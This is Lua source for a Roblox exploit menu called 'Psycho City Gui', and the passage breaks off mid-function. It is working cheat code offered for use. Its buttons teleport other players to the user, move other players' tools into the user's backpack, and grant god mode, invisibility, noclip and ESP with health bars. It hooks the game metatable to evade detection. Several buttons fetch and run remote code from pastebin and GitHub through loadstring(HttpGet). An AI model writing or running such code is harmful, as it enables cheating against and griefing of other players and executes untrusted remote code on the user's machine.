	local PUTASOS_SCRIPT = Extra_Frame.Scroll.PUTASOS_SCRIPT
	local RUSSO_FE = Extra_Frame.Scroll.RUSSO_FE
	local REJOIN = Extra_Frame.Scroll.REJOIN
	local GIVE_TOOLS = Extra_Frame.Scroll.GIVETOOLS
	local GODMODE = Extra_Frame.Scroll.GODMODE
	local INVISIBLE = Extra_Frame.Scroll.INVISIBLE
	local avatar = Extra_Frame.Scroll.avatar
	--------
	
	local AIR = Scripts.ScrollingFrame.AIR
	local ARMOR = Scripts.ScrollingFrame.ARMOR
	local ESPALL = Scripts.ScrollingFrame.ESPALL
	local FREENIGHT = Scripts.ScrollingFrame.FREENIGHT
	local FREETHERMAL = Scripts.ScrollingFrame.FREETHERMAL
	local FULLBRIGHT = Scripts.ScrollingFrame.FULLBRIGHT
	local GODFIRE = Scripts.ScrollingFrame.GODFIRE
	local JUMPCOOLDOWN = Scripts.ScrollingFrame.JUMPCOOLDOWN
	local NOCLIP = Scripts.ScrollingFrame.NOCLIP
	local OPENDISCORD = Scripts.ScrollingFrame.OPENDISCORD
	local WEAPONS = Scripts.ScrollingFrame.WEAPONS
	local Kill_BTN = VIP_Frame.KILL_BTN
	local Bring_BTN = VIP_Frame.Bring_BTN
	local Unbring_BTN = VIP_Frame.Unbring_BTN
	local targets_box = VIP_Frame.targets_box
	local RS = game:GetService("RunService")
	
	local MainButton = Main_Frame.Boton1
	local ExtraScripts = Main_Frame.Boton2
	local CreditsButton = Main_Frame.Boton3
	local VIP_BUTTON = Main_Frame.Boton4
	local Discord_Button = Main_Frame.DiscordButton
	
	local OpenButton = script.Parent.Open
	local DestroyGui = script.Parent.Main.Bye
	
	
	
	
	-----------------------------------|
	Main_Frame.Visible = false
	wait()
	
	
	
	
	DestroyGui.MouseButton1Click:Connect(function()
		script.Parent.Main:TweenPosition(UDim2.new(0.18, 0,10.088, 0))
		
		OpenButton:TweenPosition(UDim2.new(0.18, 0,1.088, 0))
		
		wait(3)
		script.Parent:Destroy()
	end)
	
	
	OpenButton.MouseButton1Click:Connect(function()
		if Main_Frame.Visible == false then
			Main_Frame.Visible = true
		else
			Main_Frame.Visible = false
		end
	end)
	
	
	
	
	
	
	Main_Frame.Changed:Connect(function()
		if Main_Frame.Visible == false then -- 
			OpenButton.Icon.Image = "rbxassetid://7072723598"
		elseif Main_Frame.Visible == true then
			OpenButton.Icon.Image = "rbxassetid://7072723637"
		end
	end)
	
	
	
	
	
	User_txt.Text = 'Welcome, '.. game.Players.LocalPlayer.Name
	
	Discord_Button.MouseButton1Click:Connect(function()
		site = string.gsub(string.gsub(Discord,"/","\\"),":\\\\","://").."?www.roblox.com"
		local gui = game.GuiService:OpenBrowserWindow(site)
	end)
	
	VIP_BUTTON.MouseButton1Click:Connect(function()
		script.Parent.Main.VIP.Visible = true
		script.Parent.Main.Credits.Visible = false
		script.Parent.Main.Main.Visible = false
		script.Parent.Main.Extras.Visible = false
	end)
	
	CreditsButton.MouseButton1Click:Connect(function()
		script.Parent.Main.VIP.Visible = false
		script.Parent.Main.Credits.Visible = true
		script.Parent.Main.Main.Visible = false
		script.Parent.Main.Extras.Visible = false
	end)
	
	MainButton.MouseButton1Click:Connect(function()
		script.Parent.Main.VIP.Visible = false
		script.Parent.Main.Credits.Visible = false
		script.Parent.Main.Main.Visible = true
		script.Parent.Main.Extras.Visible = false
	end)
	
	ExtraScripts.MouseButton1Click:Connect(function()
		script.Parent.Main.VIP.Visible = false
		script.Parent.Main.Credits.Visible = false
		script.Parent.Main.Main.Visible = false
		script.Parent.Main.Extras.Visible = true
	end)
	
	
	Kill_BTN.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/3NHbFVf8", true))()
	end)
	
	Bring_BTN.MouseButton1Click:Connect(function()
		_G.bringEnabled = true
		_G.target_table = {}
		if _G.bringEnabled then
			local target = targets_box.Text
			local targets = string.split(target,",")
			if target:lower() == "all" then
				for _, p in pairs(game.Players:GetPlayers()) do
					if p.Name == game.Players.LocalPlayer.Name then
						continue
					end
					table.insert(_G.target_table, p)
				end
			else
				if #targets >= 1 then
					for _, t in pairs(targets) do
						for _, p in pairs(game.Players:GetPlayers()) do
							if p.Name == game.Players.LocalPlayer.Name then
								continue
							end
							if t:lower() == p.Name:lower():sub(1,#t) then
								table.insert(_G.target_table, p)
							end
						end
					end
				end
			end
			RS.RenderStepped:Connect(function()
				if _G.bringEnabled then
					if #_G.target_table >= 1 then
						for _, t in pairs(_G.target_table) do
							if t.Character:FindFirstChild("HumanoidRootPart") then
								t.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,2, -4.5)
							end
						end
					end
				else
					return
				end
			end)
		end
	end)
	
	Unbring_BTN.MouseButton1Click:Connect(function()
		_G.target_table = {}
		_G.bringEnabled = false
	end)
	
	
	
	
	--script.Parent.Rotation = math.random(-7.75, 7.75)
	
	
	
	
	OPENDISCORD.MouseButton1Click:Connect(function()
		site = string.gsub(string.gsub(Discord,"/","\\"),":\\\\","://").."?www.roblox.com"
		local gui = game.GuiService:OpenBrowserWindow(site)
	end)
	
	
	NOCLIP.MouseButton1Click:Connect(function()
		_G.ByPASS = not _G.ByPASS
		if _G.ByPASS then
			game.StarterGui:SetCore("SendNotification", { --
				Icon = "http://www.roblox.com/asset/?id=7108604634";
				Title="Psycho City Gui",
				Text="AntiNoClip [ON]"
			})
		else
			game.StarterGui:SetCore("SendNotification", { --
				Icon = "http://www.roblox.com/asset/?id=7108604634";
				Title="Psycho City Gui",
				Text="AntiNoClip [OFF]"
			})
		end
		spawn(function()
			while true do
				if not _G.ByPASS then
					break
				end
				wait()
				local Me = game.Players.LocalPlayer
				local character = Me:FindFirstChild("Character") or Me.Character
				if character then
					for _,pass in pairs(character:GetDescendants()) do
						if pass.Name == "JumpCooldown" or pass:IsA("LocalScript") or pass:IsA("Script") then
							game.Players.LocalPlayer.Character.JumpCooldown.Disabled = true
							pass:Destroy()
						end
					end
				else
					_G.ByPASS = false
					game.StarterGui:SetCore("SendNotification", { --
						Icon = "http://www.roblox.com/asset/?id=7108604634";
						Title="Psycho City Gui",
						Text="JCOOLDOWN [NOT FOUND SCRIPT]"
					})
					break
				end
			end
		end)
	end)
	
	JUMPCOOLDOWN.MouseButton1Click:Connect(function()
		_G.JumpCooldown = not _G.JumpCooldown
		if _G.JumpCooldown then
			game.StarterGui:SetCore("SendNotification", { --
				Icon = "http://www.roblox.com/asset/?id=7108604634";
				Title="Psycho City Gui",
				Text="JumpCooldown [ON]"
			})
		else
			game.StarterGui:SetCore("SendNotification", { --
				Icon = "http://www.roblox.com/asset/?id=7108604634";
				Title="Psycho City Gui",
				Text="JumpCooldown [OFF]"
			})
		end
		spawn(function()
			while true do
				if not _G.JumpCooldown then
					break
				end
				wait()
				local Me = game.Players.LocalPlayer
				local character = Me:FindFirstChild("Character") or Me.Character
				if character then
					for _,JumpCooldown in pairs(character:GetDescendants()) do
						if JumpCooldown.Name == "JumpCooldown" or JumpCooldown:IsA("LocalScript") or JumpCooldown:IsA("Script") then
							game.Players.LocalPlayer.Character.JumpCooldown.Disabled = true
							JumpCooldown:Destroy()
						end
					end
				else
					_G.JumpCooldown = false
					game.StarterGui:SetCore("SendNotification", { --
						Icon = "http://www.roblox.com/asset/?id=7108604634";
						Title="Psycho City Gui",
						Text="JCOOLDOWN [NOT FOUND SCRIPT]"
					})
					break
				end
			end
		end)
	end)
	
	GODFIRE.MouseButton1Click:Connect(function()
		_G.fireInmune = not _G.fireInmune
		if _G.fireInmune then
			game.StarterGui:SetCore("SendNotification", { --
				Icon = "http://www.roblox.com/asset/?id=7108604634";
				Title="Psycho City Gui",
				Text="GOD FIRE [ON]"
			})
		else
			game.StarterGui:SetCore("SendNotification", { --
				Icon = "http://www.roblox.com/asset/?id=7108604634";
				Title="Psycho City Gui",
				Text="GOD FIRE [OFF]"
			})
		end
		spawn(function()
			while true do
				if not _G.fireInmune then
					break
				end
				wait()
				local Me = game.Players.LocalPlayer
				local character = Me:FindFirstChild("Character") or Me.Character
				if character then
					for _,fire in pairs(character:GetDescendants()) do
						if fire.Name == "fire" or fire:IsA("ParticleEmitter") then
							for _,x in pairs(fire:GetChildren()) do
								if x:IsA("Script") then 
									x:Destroy()
								end
							end
						end
					end
				else
					_G.fireInmune = false
					game.StarterGui:SetCore("SendNotification", { --
						Icon = "http://www.roblox.com/asset/?id=7108604634";
						Title="Psycho City Gui",
						Text="GOD FIRE [NOT FOUND FIRE]"
					})
					break
				end
			end
		end)
	end)
	
	
	FULLBRIGHT.MouseButton1Click:Connect(function()
		if not _G.FullBrightExecuted then
	
			_G.FullBrightEnabled = false
	
			_G.NormalLightingSettings = {
				Brightness = game:GetService("Lighting").Brightness,
				ClockTime = game:GetService("Lighting").ClockTime,
				FogEnd = game:GetService("Lighting").FogEnd,
				GlobalShadows = game:GetService("Lighting").GlobalShadows,
				Ambient = game:GetService("Lighting").Ambient
			}
	
			game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
				if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
					_G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
					if not _G.FullBrightEnabled then
						repeat
							wait()
						until _G.FullBrightEnabled
					end
					game:GetService("Lighting").Brightness = 1
				end
			end)
	
			game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
				if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
					_G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
					if not _G.FullBrightEnabled then
						repeat
							wait()
						until _G.FullBrightEnabled
					end
					game:GetService("Lighting").ClockTime = 18
				end
			end)
	
			game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
				if game:GetService("Lighting").FogEnd ~= 10000 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
					_G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
					if not _G.FullBrightEnabled then
						repeat
							wait()
						until _G.FullBrightEnabled
					end
					game:GetService("Lighting").FogEnd = 10000
				end
			end)
	
			game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
				if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
					_G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
					if not _G.FullBrightEnabled then
						repeat
							wait()
						until _G.FullBrightEnabled
					end
					game:GetService("Lighting").GlobalShadows = false
				end
			end)
	
			game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
				if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
					_G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
					if not _G.FullBrightEnabled then
						repeat
							wait()
						until _G.FullBrightEnabled
					end
					game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
				end
			end)
	
			game:GetService("Lighting").Brightness = 1
			game:GetService("Lighting").ClockTime = 12
			game:GetService("Lighting").FogEnd = 786543
			game:GetService("Lighting").GlobalShadows = false
			game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
	
			local LatestValue = true
			spawn(function()
				repeat
					wait()
				until _G.FullBrightEnabled
				while wait() do
					if _G.FullBrightEnabled ~= LatestValue then
						if not _G.FullBrightEnabled then
							game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
							game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
							game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
							game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
							game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
						else
							game:GetService("Lighting").Brightness = 1
							game:GetService("Lighting").ClockTime = 12
							game:GetService("Lighting").FogEnd = 786543
							game:GetService("Lighting").GlobalShadows = false
							game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
						end
						LatestValue = not LatestValue
					end
				end
			end)
		end
	
		_G.FullBrightExecuted = true
		_G.FullBrightEnabled = not _G.FullBrightEnabled
		if _G.FullBrightEnabled then
			game.StarterGui:SetCore("SendNotification", {
				Title="Psycho Gui",
				Text= "Day [ON]",
				Duration=1.5
			})
		else
			game.StarterGui:SetCore("SendNotification", {
				Title="Psycho Gui",
				Text= "Day [OFF]",
				Duration=1.5
			})
		end
	end)
	
	FREENIGHT.MouseButton1Click:Connect(function()
		game.ReplicatedStorage:FindFirstChild("SpawnModels"):FindFirstChild("Night Vision Goggles"):FindFirstChild("Clone"):Clone().Parent = game.Players.LocalPlayer.Character
	end)
	
	FREETHERMAL.MouseButton1Click:Connect(function()
		game.ReplicatedStorage:FindFirstChild("SpawnModels"):FindFirstChild("Thermal Vision Goggles"):FindFirstChild("Clone"):Clone().Parent = game.Players.LocalPlayer.Character
	end)
	
	
	
	WEAPONS.MouseButton1Click:Connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Icon = "http://www.roblox.com/asset/?id=7108604634";
			Title="Psycho City Gui",
			Text="GIVE WEAPONS"
		})
		for _, player in pairs(game.Players:GetPlayers()) do
			if player.Name == game.Players.LocalPlayer.Name then continue end
			for _, tool in pairs(player.Backpack:GetChildren()) do
				if tool:IsA("Tool") then
					tool.Parent = game.Players.LocalPlayer.Backpack
				end
			end
		end
	end)
	
	
	avatar.MouseButton1Click:Connect(function()
		local player = game:GetService("Players").LocalPlayer
		game:GetService("TeleportService"):Teleport(7144092699, player)
	end)
	
	INVISIBLE.MouseButton1Click:Connect(function()
		-- Full credit to AmokahFox @V3rmillion
		local Player = game.Players.LocalPlayer
		repeat wait(.1) until Player.Character
		local Character = Player.Character
		Character.Archivable = true
		local IsInvis = false
		local IsRunning = true
		local InvisibleCharacter = Character:Clone()
		InvisibleCharacter.Parent = game:GetService'Lighting'
		local Void = workspace.FallenPartsDestroyHeight
		InvisibleCharacter.Name = ""
		local CF
	
		local invisFix = game:GetService("RunService").Stepped:Connect(function()
			pcall(function()
				local IsInteger
				if tostring(Void):find'-' then
					IsInteger = true
				else
					IsInteger = false
				end
				local Pos = Player.Character.HumanoidRootPart.Position
				local Pos_String = tostring(Pos)
				local Pos_Seperate = Pos_String:split(', ')
				local X = tonumber(Pos_Seperate[1])
				local Y = tonumber(Pos_Seperate[2])
				local Z = tonumber(Pos_Seperate[3])
				if IsInteger == true then
					if Y <= Void then
						Respawn()
					end
				elseif IsInteger == false then
					if Y >= Void then
						Respawn()
					end
				end
			end)
		end)
	
		for i,v in pairs(InvisibleCharacter:GetDescendants())do
			if v:IsA("BasePart") then
				if v.Name == "HumanoidRootPart" then
					v.Transparency = 1
				else
					v.Transparency = .5
				end
			end
		end
	
		function Respawn()
			IsRunning = false
			if IsInvis == true then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					IsInvis = false
					InvisibleCharacter.Parent = nil
					invisRunning = false
				end)
			elseif IsInvis == false then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					TurnVisible()
				end)
			end
		end
	
		local invisDied
		invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
			Respawn()
			invisDied:Disconnect()
		end)
	
		if IsInvis == true then return end
		IsInvis = true
		CF = workspace.CurrentCamera.CFrame
		local CF_1 = Player.Character.HumanoidRootPart.CFrame
		Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
		workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
		wait(.2)
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
		InvisibleCharacter = InvisibleCharacter
		Character.Parent = game:GetService'Lighting'
		InvisibleCharacter.Parent = workspace
		InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
		Player.Character = InvisibleCharacter
		Player.Character.Animate.Disabled = true
		Player.Character.Animate.Disabled = false
	
		function TurnVisible()
			if IsInvis == false then return end
			invisFix:Disconnect()
			invisDied:Disconnect()
			CF = workspace.CurrentCamera.CFrame
			Character = Character
			local CF_1 = Player.Character.HumanoidRootPart.CFrame
			Character.HumanoidRootPart.CFrame = CF_1
			InvisibleCharacter:Destroy()
			Player.Character = Character
			Character.Parent = workspace
			IsInvis = false
			Player.Character.Animate.Disabled = true
			Player.Character.Animate.Disabled = false
			invisDied = Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
				Respawn()
				invisDied:Disconnect()
			end)
			invisRunning = false
		end
	end)
	
	
	
	GODMODE.MouseButton1Click:Connect(function()
		local Cam = workspace.CurrentCamera
		local Pos, Char = Cam.CFrame, game.Players.LocalPlayer.Character
		local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
		local nHuman = Human.Clone(Human)
		nHuman.Parent, game.Players.LocalPlayer.Character = Char, nil
		nHuman.SetStateEnabled(nHuman, 15, false)
		nHuman.SetStateEnabled(nHuman, 1, false)
		nHuman.SetStateEnabled(nHuman, 0, false)
		nHuman.BreakJointsOnDeath, Human = true, Human.Destroy(Human)
		game.Players.LocalPlayer.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, wait() and Pos
		nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		local Script = Char.FindFirstChild(Char, "Animate")
		if Script then
			Script.Disabled = true
			wait()
			Script.Disabled = false
		end
		nHuman.Health = nHuman.MaxHealth
	end)
	
	
	GIVE_TOOLS.MouseButton1Click:Connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Icon = "http://www.roblox.com/asset/?id=7108604634";
			Title="Psycho City Gui",
			Text="GIVE WEAPONS"
		})
		for _, player in pairs(game.Players:GetPlayers()) do
			if player.Name == game.Players.LocalPlayer.Name then continue end
			for _, tool in pairs(player.Backpack:GetChildren()) do
				if tool:IsA("Tool") then
					tool.Parent = game.Players.LocalPlayer.Backpack
				end
			end
		end
	end)
	
	
	REJOIN.MouseButton1Click:Connect(function()
		local ts = game:GetService("TeleportService")
		local p = game:GetService("Players").LocalPlayer
		ts:Teleport(game.PlaceId, p)
	end)
	
	Hitbox.MouseButton1Click:Connect(function()
		_G.HeadSize = 5
		_G.Disabled = true
	
		game:GetService('RunService').RenderStepped:connect(function()
			if _G.Disabled then
				for i,v in next, game:GetService('Players'):GetPlayers() do
					if v.Name ~= game:GetService('Players').LocalPlayer.Name then
						pcall(function()
							v.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
							v.Character.HumanoidRootPart.Transparency = 1
							v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Lime green")
							v.Character.HumanoidRootPart.Material = "Neon"
							v.Character.HumanoidRootPart.CanCollide = false
						end)
					end
				end
			end
		end)
	end)
	
	INFINITE_YIELD.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
	end)
	
	ESP_PLAYER.MouseButton1Click:Connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Icon = "http://www.roblox.com/asset/?id=7108604634";
			Title="SGAMESC",
			Text="Esp Players",
			Duration=0.01
		})
		local ScreenGui = Instance.new("ScreenGui",game:GetService('CoreGui'))
		local ESPLocation = Instance.new("Folder",ScreenGui)
		local targetPlayer = ""
	
		local Targets = {
			"HumanoidRootPart",
			    --[["LeftLowerArm",
			    "LeftUpperArm",
			    "LowerTorso",
			    "RightLowerArm",
			    "RightUpperArm",
			    "RightUpperLeg",
			    "LeftLowerLeg",
			    "LeftUpperLeg",
			    "RightLowerLeg",
			    "UpperTorso"--]]
		}
	
	
		function espPart(part,player)
			local esp = Instance.new("BoxHandleAdornment",ESPLocation)
			esp.Adornee = part
			esp.AlwaysOnTop = true
			esp.ZIndex = 1
			esp.Transparency = 0.7
			esp.Size = part.Size / 1.1
			if part.Name == "LeftHand" or part.Name == "RightHand" then
				esp.Size = part.Size - Vector3.new(0,1,0)
			end
			esp.Color3 = player.TeamColor.Color
			if player.Name == targetPlayer then
				esp.Size = part.Size + Vector3.new(.1, .1, .1)
				esp.Color3 = Color3.fromRGB(255,255,0)
			end
			esp.MouseEnter:Connect(function()
				if player.Team ~= game:GetService('Players').LocalPlayer.Team then
					local currentFrame = esp
				end
			end)
	
			player.CharacterRemoving:Connect(function()
				esp:Destroy()
			end)
			if player.Team then
				player.Team.PlayerRemoved:Connect(function(RemovedPlayer)
					if RemovedPlayer ~= player and RemovedPlayer ~= game:GetService('Players').LocalPlayer then
						return
					else
						esp.Color3 = player.TeamColor.Color
					end
				end)
			end
		end
	
		function espPlayer(player)
			if player.Character ~= nil then
				for _,part in pairs(player.Character:GetChildren())do
					if part:IsA("BasePart") and part.Name ~= "Head" and part.Name ~= "RightHand" and part.Name ~= "LeftHand" and part.Name ~= "LeftFoot" and part.Name ~= "RightFoot" then
						--print(part)
						espPart(part,player)
					end
				end
			end
		end
	
		function ESP()
			ESPLocation:ClearAllChildren()
			for _,player in pairs(game:GetService('Players'):GetPlayers())do
				if player ~= game:GetService('Players').LocalPlayer then
					espPlayer(player)
				end
			end
		end
	
		ESP()
	
		local function WaitUntilCharacterLoaded(Char)
			for _,Part in pairs(Targets)do
				Char:WaitForChild(Part)
			end
		end
	
		game:GetService('Players').PlayerAdded:Connect(function(Player)
			Player.CharacterAdded:Connect(function(Char)
				WaitUntilCharacterLoaded(Char)
				espPlayer(Player)
			end)
		end)
	
		for _,Player in pairs(game:GetService('Players'):GetPlayers())do
			if Player ~= game:GetService('Players').LocalPlayer then
				Player.CharacterAdded:Connect(function(Char)
					WaitUntilCharacterLoaded(Char)
					espPlayer(Player)
				end)
			end
		end
	
		--// ESP NAMES
	
		repeat wait() until game:IsLoaded()
	
		local LocalPlayer = game:GetService("Players").LocalPlayer
		local GameMt = getrawmetatable(game)
		local OldIndex = GameMt.__index
	
		setreadonly(GameMt, false)
	
		GameMt.__index = newcclosure(function(Self, Key)
			if not checkcaller() and Key == "BillboardGui" then
				return nil
			end
	
			return OldIndex(Self, Key)
		end)
	
		setreadonly(GameMt, true)
	
	
		local Players = game:GetService('Players')
		local LP = Players.LocalPlayer
	
	
	
		local function espPlayer(player)
			for i,v in pairs(getconnections(player.Character.Head.ChildAdded)) do
				v:Disable()
			end
			local billgui = Instance.new('BillboardGui', player.Character.Head)
			local textlab = Instance.new('TextLabel', billgui)
	
			billgui.Name = "ESP"
			billgui.AlwaysOnTop = true
			billgui.ExtentsOffset = Vector3.new(0, 3, 0)
			billgui.Size = UDim2.new(10, 0, 10, 0)
	
			textlab.Name = 'Player'
			textlab.BackgroundColor3 = Color3.new(255, 255, 255)
			textlab.BackgroundTransparency = 1    
			textlab.BorderSizePixel = 0
			textlab.Position = UDim2.new(0, 0, 0, 0)
			textlab.Size = UDim2.new(1, 0, 1, 0)
			textlab.Visible = true
			textlab.ZIndex = 10
			textlab.Font = 'SciFi'
			textlab.FontSize = 'Size14'
			textlab.Text = player.Name
			textlab.TextTransparency = 0
			textlab.TextStrokeTransparency = 1
			textlab.TextColor3 = Color3.fromRGB(0,255,127)
	
			player.Character:WaitForChild('Humanoid').DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		end
	
		local function createHealthbar(player)
			--print("healthing " .. player.Name)
			local hrp = player.Character:WaitForChild("HumanoidRootPart")
			board =Instance.new("BillboardGui", hrp) --//Creates the BillboardGui with HumanoidRootPart as the Parent
			board.Name = "total"
			board.Size = UDim2.new(1,0,1,0)
			board.StudsOffset = Vector3.new(-1,1,0)
			board.AlwaysOnTop = true
			board.MaxDistance = 130
	
			bar = Instance.new("Frame",board) --//Creates the black background
			bar.BackgroundColor3 = Color3.new(255,255,255)
			bar.BorderSizePixel = 1
			bar.Size = UDim2.new(0.2,0,5,0)
			bar.Name = "total2"
			bar.ZIndex = 9
	
			health = Instance.new("Frame",bar) --//Creates the changing green Frame
			health.BackgroundColor3 = Color3.new(0,255,0)
			health.BorderSizePixel = 1
			health.ZIndex = 10
			health.Size = UDim2.new(1,0,hrp.Parent.Humanoid.Health/hrp.Parent.Humanoid.MaxHealth,0)
			hrp.Parent.Humanoid.Changed:Connect(function(property) --//Triggers when any Property changed
				if hrp and hrp.Parent and hrp.Parent.Humanoid then
					hrp.total.total2.Frame.Size = UDim2.new(1,0,hrp.Parent.Humanoid.Health/hrp.Parent.Humanoid.MaxHealth,0) --//Adjusts the size of the red Frame	
				end                  
			end)
		end
	
		for _,player in pairs(game:GetService('Players'):GetPlayers()) do
			if player ~= Players.LocalPlayer then
				if player.Character then
					player.Character:WaitForChild('Head') 
					player.CharacterAdded:Connect(function(character)
						player.Character:WaitForChild('Head') 
						espPlayer(player)
						createHealthbar(player)
					end)
					espPlayer(player)
					createHealthbar(player)
				end
			end
		end
	
		game:GetService('Players').PlayerAdded:Connect(function(player)
			if player then
				--print(player, "has joined!")
				local char = player.Character or player.CharacterAdded:Wait()
				if char then
					player.Character:WaitForChild('Head') 
					--print(char, "'s character has been found!")
					player.CharacterAdded:Connect(function(character)
						player.Character:WaitForChild('Head') 
						player.Character:WaitForChild('Humanoid')  
						espPlayer(player)
						createHealthbar(player)
					end)
					espPlayer(player)
					createHealthbar(player)
				end
			end
		end)
	
	
		LP.CameraMaxZoomDistance = 99999999999
		LP.CameraMinZoomDistance = 0
	
		Players.PlayerAdded:Connect(function(player)
			if player == Players.LocalPlayer then
				LP.CameraMaxZoomDistance = 9999999999
				LP.CameraMinZoomDistance = 0
			end
		end)
	end)
	
	ALLANIMATION.MouseButton1Click:Connect(function()
		local httpService = game:GetService('HttpService')
		local categories = game:HttpGet('https://catalog.roblox.com/v1/categories')
		local animationCategory = httpService:JSONDecode(categories).AvatarAnimations
		local subCategory = game:HttpGet('https://catalog.roblox.com/v1/subcategories')
		local emoteCategory = httpService:JSONDecode(subCategory).EmoteAnimations
	
		local emotesTable = {}
		local cursor = ''
		local animsTable = httpService:JSONDecode(game:HttpGet('https://pastebin.com/raw/XppaAPF7'))
	
		local animsTableNames = {}
		for name in pairs(animsTable) do
			table.insert(animsTableNames, name)
		end
	
		while true do
			local requestString = ('https://catalog.roblox.com/v1/search/items/details?Category=%s&Subcategory=%s&IncludeNotForSale=true&Limit=30&Cursor=%s'):format(
			animationCategory, emoteCategory, cursor
			)
			local response = httpService:JSONDecode(game:HttpGet(requestString))
			cursor = response.nextPageCursor
	
			for _, data in ipairs(response.data) do
				table.insert(emotesTable, {
					data.name,
					data.id
				})
			end
	
			if not cursor then
				break
			end
		end
	
		table.sort(emotesTable, function(a, b)
			return a[1] < b[1]
		end)
	
		table.sort(animsTableNames)
	
		local robloxEmotes = {}
		local emoteNames = {}
	
		for _, emote in ipairs(emotesTable) do
			table.insert(emoteNames, emote[1])
			robloxEmotes[emote[1]] = { emote[2] }
		end
	
		local library = loadstring(game:HttpGet('https://raw.githubusercontent.com/Vzurxy/Scripts/main/uwuware_ui.lua'))()
		local plr = game:GetService('Players').LocalPlayer
		local character = plr.Character
		local humanoid = character:WaitForChild('Humanoid', 5) or character:FindFirstChildWhichIsA('Humanoid')
		local currentEmotes = {}
		local selectedEmotes = currentEmotes
	
		if not humanoid then
			return
		end
	
		local function updateCurrentEmotes()
			local description = humanoid.HumanoidDescription
			local emotes = description:GetEquippedEmotes()
	
			currentEmotes = {}
			selectedEmotes = {}
	
			for _, data in ipairs(emotes) do
				table.insert(currentEmotes, data.Name)
			end
	
			selectedEmotes = currentEmotes
			humanoid.HumanoidDescription:SetEmotes(robloxEmotes)
		end
	
		local function updateAnimations()
			local animation = animsTable[library.flags.anim]
			local animate = character:WaitForChild('Animate', 5) or character:FindFirstChild('Animate', true)
	
			if not animate then return end
	
			local swimIdle = false
	
			for anim, data in pairs(animation) do
				for idx, id in ipairs(data) do
					local obj = animate:WaitForChild(anim, 5)
					if not obj then return end
					if anim == 'idle' then
						obj:WaitForChild('Animation' .. idx).AnimationId = id
					elseif anim == 'swim' then
						if not swimIdle then
							obj:WaitForChild('Swim').AnimationId = id
							swimIdle = true
						else
							animate:WaitForChild('swimidle').SwimIdle.AnimationId = id
						end
					else
						local parsed = anim:gsub('^.', anim.upper)
						obj:WaitForChild(parsed .. 'Anim').AnimationId = id
					end
				end
			end
		end
	
		pcall(updateCurrentEmotes)
	
		plr.CharacterAdded:Connect(function(newCharacter)
			character = newCharacter
			humanoid = newCharacter:WaitForChild('Humanoid', 5) or newCharacter:FindFirstChildWhichIsA('Humanoid')
	
			humanoid.HumanoidDescription:SetEmotes(robloxEmotes)
			humanoid.HumanoidDescription:SetEquippedEmotes(selectedEmotes)
	
			pcall(updateAnimations)
		end)
	
		local window = library:CreateWindow('Roblox Emotes') do
			local emotes = window:AddFolder('Emotes') do
				for number = 1, 8 do
					emotes:AddList({
						text = ('Emote %s'):format(number),
						flag = ('emote%s'):format(number),
						value = currentEmotes[number],
						values = emoteNames,
						callback = function(selectedEmote)
							selectedEmotes[number] = selectedEmote
						end
					})
				end
				emotes:AddButton({
					text = 'Apply Emotes',
					flag = 'emote',
					callback = function()
						humanoid.HumanoidDescription:SetEquippedEmotes(selectedEmotes)
					end
				})
			end
			local animations = window:AddFolder('Animations') do
	
				local defaultValue = 'Mocap' do
					local animate = character:WaitForChild('Animate', 5) or character:FindFirstChild('Animate', true)
					if not animate then return end
					local walkAnim = animate:FindFirstChild('WalkAnim', true)
	
					if walkAnim then
						local assetInfo = game:GetService('MarketplaceService'):GetProductInfo(walkAnim.AnimationId:match('%d+'))
